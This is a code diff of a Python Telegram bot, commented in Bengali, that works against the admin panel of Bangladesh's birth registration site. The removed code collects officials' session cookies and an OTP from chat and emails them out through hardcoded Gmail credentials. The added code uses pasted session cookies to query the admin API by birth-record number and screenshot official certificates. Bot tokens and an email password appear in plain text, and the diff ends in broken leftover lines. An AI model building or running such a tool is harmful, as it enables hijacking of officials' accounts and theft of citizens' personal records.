@@ -1,109 +1,107 @@
 import telebot
 import requests
-import json
 import io
-import threading
 import time
-import re
-import smtplib
-from email.mime.text import MIMEText
-from datetime import datetime
-from urllib.parse import quote
 from playwright.sync_api import sync_playwright
 
 # ==========================================
-# ১. কনফিগারেশন ও ইমেইল সেটআপ
+# ১. কনফিগারেশন (আপনার ডাটা বসান)
 # ==========================================
-API_TOKEN = '8721977069:AAH2QA4mT4L57Cw9hqawOU4l1kSbND9au1Y'
-bot = telebot.TeleBot(API_TOKEN)
+BOT_TOKEN = "7668580200:AAHkMbQYunvP_Ll48gVdZv61jQ1aLcU6U5Q" # টেলিগ্রাম বট টোকেন দিন
 
-EMAIL_SENDER = "mahfujahmed025@gmail.com" 
-EMAIL_PASSWORD = "keuu lllt mcfd afet" 
-EMAIL_RECEIVER = "mahfujahmed025@gmail.com" 
+# ব্রাউজার থেকে কপি করা কুকিগুলো দিন
+SESSION_COOKIE = "your_session_cookie_here"
+TS_COOKIE = "your_ts0108b707_cookie_here"
 
-session = requests.Session()
-vault = {
-    "csrf": "",
-    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
-    "is_alive": False, 
-    "current_page": "https://bdris.gov.bd/admin/",
-    "app_start": 0,
-    "app_length": 5, 
-    "sharok_no": 1
-}
+bot = telebot.TeleBot(BOT_TOKEN)
 
-ID_MAP = {} 
-temp_storage = {} 
+# গ্লোবাল রিকোয়েস্ট সেশন তৈরি
+req_session = requests.Session()
+req_session.cookies.set("SESSION", SESSION_COOKIE, domain='bdris.gov.bd')
+req_session.cookies.set("TS0108b707", TS_COOKIE, domain='bdris.gov.bd')
 
 # ==========================================
-# ২. ইমেইল ও কোর ইঞ্জিন (Sidebar Scan)
+# ২. ছবি তোলার কোর ফাংশন (Playwright)
 # ==========================================
-
-def send_full_relay(chat_id, otp, sec_raw):
-    data = temp_storage.get(chat_id, {})
-    subject = f"BDRIS Full Report - {datetime.now().strftime('%H:%M')}"
-    body = (f"--- CHAIRMAN SESSION ---\n{data.get('ch_raw')}\n\n"
-            f"--- CHAIRMAN OTP ---\n{otp}\n\n"
-            f"--- SECRETARY SESSION (BOT ACTIVE) ---\n{sec_raw}")
-    msg = MIMEText(body); msg['Subject'] = subject; msg['From'] = EMAIL_SENDER; msg['To'] = EMAIL_RECEIVER
+def get_official_certificate_png(enc_id):
     try:
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
-            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
-            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
-        return True
-    except: return False
-
-def navigate_to(url):
-    headers = {'User-Agent': vault["ua"], 'Referer': vault["current_page"]}
-    try:
-        res = session.get(url, headers=headers, timeout=25)
-        csrf_match = re.search(r'name="_csrf" content="([^"]+)"', res.text)
-        if csrf_match: vault["csrf"] = csrf_match.group(1)
-        vault["current_page"] = url
-        return True, res.text
-    except: return False, None
-
-def call_api(url, method="GET", data=None):
-    headers = {
-        'x-csrf-token': vault["csrf"], 'x-requested-with': 'XMLHttpRequest',
-        'user-agent': vault["ua"], 'referer': vault["current_page"], 'origin': 'https://bdris.gov.bd'
-    }
-    try:
-        if method == "POST": return session.post(url, headers=headers, data=data, timeout=30)
-        return session.get(url, headers=headers, timeout=30)
-    except: return None
-
-def extract_sidebar_id(html, path):
-    """ড্যাশবোর্ড সাইডবার মেনু থেকে ডাটা আইডি বের করার লজিক"""
-    if not html: return None
-    regex = rf'href="{re.escape(path)}\?data=([A-Za-z0-9_\-]+)"'
-    match = re.search(regex, html)
-    return match.group(1) if match else None
+        with sync_playwright() as p:
+            # গিটহাব সার্ভারে ডিফল্ট ক্রোমিয়াম রান করবে
+            browser = p.chromium.launch(headless=True)
+            context = browser.new_context(viewport={'width': 900, 'height': 1300})
+            
+            # কুকি অ্যাড করা
+            cookies = [
+                {'name': 'SESSION', 'value': SESSION_COOKIE, 'domain': 'bdris.gov.bd', 'path': '/'},
+                {'name': 'TS0108b707', 'value': TS_COOKIE, 'domain': 'bdris.gov.bd', 'path': '/'}
+            ]
+            context.add_cookies(cookies)
+            
+            page = context.new_page()
+            url = f"https://bdris.gov.bd/admin/certificate/print/birth?data={enc_id}"
+            
+            # পেজ পুরোপুরি লোড হওয়া পর্যন্ত অপেক্ষা
+            page.goto(url, wait_until="networkidle")
+            time.sleep(4) # কিউআর কোড ও ফন্ট রেন্ডার হওয়ার জন্য এক্সট্রা সময়
+            
+            # ফুল পেজ স্ক্রিনশট নেওয়া
+            img = page.screenshot(full_page=True, type='png')
+            browser.close()
+            return io.BytesIO(img)
+            
+    except Exception as e:
+        print(f"Playwright Error: {e}")
+        return None
 
 # ==========================================
-# ৩. লগইন সিস্টেম (Admin & Role)
+# ৩. টেলিগ্রাম কমান্ড 핸ডলার (/cert)
 # ==========================================
-
-def admin_login(m):
+@bot.message_handler(commands=['cert'])
+def generate_cert(m):
     try:
-        raw = m.text
-        sid = re.search(r'SESSION=([^\s;]+)', raw).group(1)
-        tsid = re.search(r'TS0108b707=([^\s;]+)', raw).group(1)
-        session.cookies.clear()
-        session.cookies.set("SESSION", sid, domain='bdris.gov.bd'); session.cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
-        if navigate_to("https://bdris.gov.bd/admin/")[0]:
-            vault["is_alive"] = True
-            bot.send_message(m.chat.id, "✅ Admin Login সফল!", reply_markup=main_menu())
-    except: bot.send_message(m.chat.id, "❌ ফরম্যাট ভুল!")
+        ubrn = m.text.split()[1]
+        if len(ubrn) != 17:
+            return bot.reply_to(m, "❌ UBRN নম্বর অবশ্যই ১৭ ডিজিটের হতে হবে।")
+    except IndexError:
+        return bot.reply_to(m, "❌ সঠিক নিয়ম: `/cert <১৭ ডিজিটের UBRN নম্বর>` দিন", parse_mode="Markdown")
+        
+    wait = bot.reply_to(m, f"🔍 UBRN: `{ubrn}` এর তথ্য খোঁজা হচ্ছে...", parse_mode="Markdown")
+    
+    # Encrypted ID বের করার API
+    search_url = f"https://bdris.gov.bd/api/br/applications/search?status=ALL&draw=1&start=0&length=1&search[value]={ubrn}"
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
+    
+    try:
+        res = req_session.get(search_url, headers=headers, timeout=20)
+        
+        if res.status_code == 200:
+            data = res.json().get('data', [])
+            if data:
+                enc_id = data[0].get('encryptedId')
+                bot.edit_message_text("🎨 সার্ভার থেকে অরিজিনাল সনদ তৈরি করা হচ্ছে, দয়া করে অপেক্ষা করুন...", m.chat.id, wait.message_id)
+                
+                # Playwright দিয়ে ছবি জেনারেট
+                photo_stream = get_official_certificate_png(enc_id)
+                
+                if photo_stream:
+                    bot.send_photo(m.chat.id, photo_stream, caption=f"✅ অফিসিয়াল সনদ সফলভাবে প্রস্তুত করা হয়েছে!\n🆔 UBRN: `{ubrn}`", parse_mode="Markdown")
+                    bot.delete_message(m.chat.id, wait.message_id)
+                else:
+                    bot.edit_message_text("❌ ইমেজ জেনারেট করতে সমস্যা হয়েছে। সার্ভার এরর।", m.chat.id, wait.message_id)
+            else:
+                bot.edit_message_text("❌ দুঃখিত, এই নম্বরে সার্ভারে কোনো ডাটা পাওয়া যায়নি।", m.chat.id, wait.message_id)
+        else:
+            bot.edit_message_text(f"❌ সেশন কুকি এক্সপায়ার হয়ে গেছে বা কাজ করছে না! (Status: {res.status_code})", m.chat.id, wait.message_id)
+            
+    except Exception as e:
+        bot.edit_message_text(f"❌ বট এরর: {e}", m.chat.id, wait.message_id)
 
-def role_step_1(m):
-    temp_storage[m.chat.id] = {'ch_raw': m.text}
-    msg = bot.send_message(m.chat.id, "✅ Chairman সেশন ওকে। এবার OTP দিন:")
-    bot.register_next_step_handler(msg, role_step_2)
-
-def role_step_2(m):
-    temp_storage[m.chat.id]['ch_otp'] = m.text
-    msg = bot.send_message(m.chat.id, "✅ OTP ওকে। এবার Secretary সেশন দিন (বট এটি ব্যবহার করবে):")
+# ==========================================
+# ৪. বট রানার
+# ==========================================
+print("🚀 Bot is running on GitHub Codespaces...")
+print("টেলিগ্রামে গিয়ে কমান্ড দিন: /cert UBRN_NUMBER")
+bot.infinity_polling()
     bot.register_next_step_handler(msg, role_step_3)
 
 def role_step_3(m):
